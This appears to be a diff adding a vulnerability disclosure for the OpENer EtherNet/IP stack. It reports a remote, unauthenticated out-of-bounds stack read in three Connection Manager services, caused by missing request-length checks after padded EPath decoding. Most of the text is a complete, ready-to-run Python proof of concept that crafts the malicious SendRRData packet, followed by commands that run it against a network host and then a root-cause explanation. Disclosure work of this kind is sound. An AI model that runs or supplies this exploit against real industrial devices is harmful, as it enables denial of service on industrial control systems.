@@ -1,0 +1,118 @@
+issue #577
+
+Summary
+A crafted EtherNet/IP SendRRData request can reach the Connection Manager on the current master branch and trigger a remote stack-buffer-overflow read in one of three instance services:
+
+ForwardClose (0x4E)
+GetConnectionData (0x56)
+SearchConnectionData (0x57)
+The root cause is missing minimum request-body length validation in these service handlers after Message Router path decoding. A long but syntactically acceptable padded EPath can consume the entire CIP payload, leaving message_router_request->request_data_size == 0, yet the handlers still directly call GetUintFromMessage() / GetUdintFromMessage() on message_router_request->data.
+
+This is a real network-reachable server-side bug in the TCP explicit messaging path (RegisterSession -> SendRRData) and is reproducible without ForwardOpen or special build options.
+
+At minimum, this is a remote unauthenticated denial of service.
+
+Version
+OpENer v2.3 / master branch up to commit 76b95cf
+
+PoC
+
+#!/usr/bin/env python3
+import os
+import socket
+import struct
+import sys
+
+
+HOST = os.environ.get("OPENER_HOST", "127.0.0.1")
+PORT = 44818
+
+TARGETS = {
+    "forwardclose": 0x4E,
+    "getconn": 0x56,
+    "searchconn": 0x57,
+}
+
+
+def encap(command: int, session: int, payload: bytes, context: bytes = b"CMSHRT!!") -> bytes:
+    return struct.pack("<HHII8sI", command, len(payload), session, 0, context, 0) + payload
+
+
+def register_session(sock: socket.socket) -> int:
+    sock.sendall(encap(0x0065, 0, struct.pack("<HH", 1, 0), b"REGSESSN"))
+    response = sock.recv(1024)
+    if len(response) < 8:
+        raise RuntimeError(f"short RegisterSession response: {response.hex()}")
+    return struct.unpack_from("<I", response, 4)[0]
+
+
+def build_cip(service: int) -> bytes:
+    path_size_words = 235
+    member_words = path_size_words - 2  # class + instance only
+    path = bytes(
+        [path_size_words, 0x20, 0x06, 0x24, 0x01]
+        + [0x28, 0x00] * member_words
+    )
+    return bytes([service]) + path
+
+
+def build_send_rr_data(session: int, cip: bytes) -> bytes:
+    cpf = struct.pack(
+        "<IHHHHHH",
+        0,
+        0,
+        2,
+        0x0000,
+        0x0000,
+        0x00B2,
+        len(cip),
+    ) + cip
+    return encap(0x006F, session, cpf)
+
+
+def main() -> int:
+    target = sys.argv[1] if len(sys.argv) > 1 else "forwardclose"
+    host = sys.argv[2] if len(sys.argv) > 2 else HOST
+    if target not in TARGETS:
+        print(f"usage: {sys.argv[0]} [{'|'.join(TARGETS)}] [host]", file=sys.stderr)
+        return 2
+
+    cip = build_cip(TARGETS[target])
+    print(f"target={target} service=0x{TARGETS[target]:02x} cip_len={len(cip)} packet_len={len(build_send_rr_data(0, cip))}")
+
+    with socket.create_connection((host, PORT), timeout=3.0) as sock:
+        session = register_session(sock)
+        print(f"session={session}")
+        sock.sendall(build_send_rr_data(session, cip))
+        sock.settimeout(1.0)
+        try:
+            response = sock.recv(4096)
+        except socket.timeout:
+            response = b""
+
+    if response:
+        print(f"response_len={len(response)} response={response.hex()}")
+    else:
+        print("response=timeout")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+
+excution:
+python3 poc.py forwardclose 192.168.153.128
+python3 poc.py getconn 192.168.153.128
+python3 poc.py searchconn 192.168.153.128
+
+
+Root cause
+This is not primarily an attribute-decoder issue and not just a generic DecodePaddedEPath() bug.
+
+The actual root cause is:
+
+DecodePaddedEPath() accepts padded Member ID segments and advances over them.
+CreateMessageRouterRequestStructure() sets message_router_request->data and request_data_size to whatever remains after the path.
+The padded path can legally consume the entire payload, leaving request_data_size == 0.
+ForwardClose, GetConnectionData, and SearchConnectionData do not validate that their required fixed-size request body is present.
+They then blindly call unchecked read helpers, producing an out-of-bounds read past the stack receive buffer.
